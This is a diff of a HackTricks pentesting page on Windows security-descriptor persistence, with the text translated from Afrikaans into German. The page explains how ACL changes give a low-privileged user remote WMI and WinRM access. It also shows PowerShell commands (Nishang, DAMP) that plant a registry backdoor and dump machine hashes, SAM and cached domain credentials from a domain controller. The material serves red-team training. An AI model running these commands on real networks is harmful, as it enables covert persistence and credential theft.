@@ -1,45 +1,45 @@
-# Sekuriteitsbeskrywings
+# Sicherheitsbeschreibungen
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PR's in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
 
-## Sekuriteitsbeskrywings
+## Sicherheitsbeschreibungen
 
-[Uit die dokumentasie](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Sekuriteitsbeskrywing Definisie Taal (SDDL) definieer die formaat wat gebruik word om 'n sekuriteitsbeskrywing te beskryf. SDDL gebruik ACE stringe vir DACL en SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`
+[Aus den Dokumenten](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Die Security Descriptor Definition Language (SDDL) definiert das Format, das verwendet wird, um einen Sicherheitsdescriptor zu beschreiben. SDDL verwendet ACE-Strings für DACL und SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`
 
-Die **sekuriteitsbeskrywings** word gebruik om die **regte** wat 'n **objek** oor 'n **objek** het, te **stoor**. As jy net 'n **klein verandering** in die **sekuriteitsbeskrywing** van 'n objek kan **maak**, kan jy baie interessante voorregte oor daardie objek verkry sonder om 'n lid van 'n bevoorregte groep te wees.
+Die **Sicherheitsbeschreibungen** werden verwendet, um die **Berechtigungen** zu **speichern**, die ein **Objekt** **über** ein **Objekt** hat. Wenn Sie nur eine **kleine Änderung** im **Sicherheitsdescriptor** eines Objekts vornehmen können, können Sie sehr interessante Berechtigungen über dieses Objekt erhalten, ohne Mitglied einer privilegierten Gruppe sein zu müssen.
 
-Dan is hierdie volhardingstegniek gebaseer op die vermoë om elke voorreg wat teen sekere objekte benodig word, te wen, om 'n taak uit te voer wat gewoonlik administratiewe voorregte vereis, maar sonder die behoefte om admin te wees.
+Diese Persistenztechnik basiert also auf der Fähigkeit, jedes benötigte Privileg gegen bestimmte Objekte zu gewinnen, um eine Aufgabe auszuführen, die normalerweise Administratorrechte erfordert, jedoch ohne die Notwendigkeit, Administrator zu sein.
 
-### Toegang tot WMI
+### Zugriff auf WMI
 
-Jy kan 'n gebruiker toegang gee om **afgeleë WMI** [**uit te voer**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
+Sie können einem Benutzer Zugriff gewähren, um **WMI remote auszuführen** [**mit diesem**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
 ```bash
 Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
 Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
 ```
-### Toegang tot WinRM
+### Zugriff auf WinRM
 
-Gee toegang tot **winrm PS-konsol aan 'n gebruiker** [**gebruik hierdie**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
+Geben Sie **einem Benutzer Zugriff auf die winrm PS-Konsole** [**unter Verwendung von diesem**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
 ```bash
 Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
 Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
 ```
 ### Remote access to hashes
 
-Toegang tot die **register** en **dump hashes** deur 'n **Reg backdoor te skep met** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** sodat jy op enige tydstip die **hash van die rekenaar**, die **SAM** en enige **gecacheerde AD** geloofsbrief in die rekenaar kan terugkry. Dit is dus baie nuttig om hierdie toestemming aan 'n **gewone gebruiker teen 'n Domeinbeheerder rekenaar** te gee:
+Greifen Sie auf die **Registry** zu und **dumpen Sie Hashes**, indem Sie eine **Reg-Backdoor mit** [**DAMP**](https://github.com/HarmJ0y/DAMP)** erstellen,** damit Sie jederzeit den **Hash des Computers**, die **SAM** und jede **cached AD**-Anmeldeinformation auf dem Computer abrufen können. Daher ist es sehr nützlich, diesem **regulären Benutzer Berechtigungen gegen einen Domain Controller-Computer** zu geben:
 ```bash
 # allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
 Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose
@@ -53,19 +53,19 @@ Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose
 # Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
 Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
 ```
-Kontroleer [**Silver Tickets**](silver-ticket.md) om te leer hoe jy die hash van die rekenaarrekening van 'n Domeinbeheerder kan gebruik.
+Überprüfen Sie [**Silver Tickets**](silver-ticket.md), um zu erfahren, wie Sie den Hash des Computerkontos eines Domain Controllers verwenden können.
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Support HackTricks</summary>
 
-* Kontroleer die [**subskripsieplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
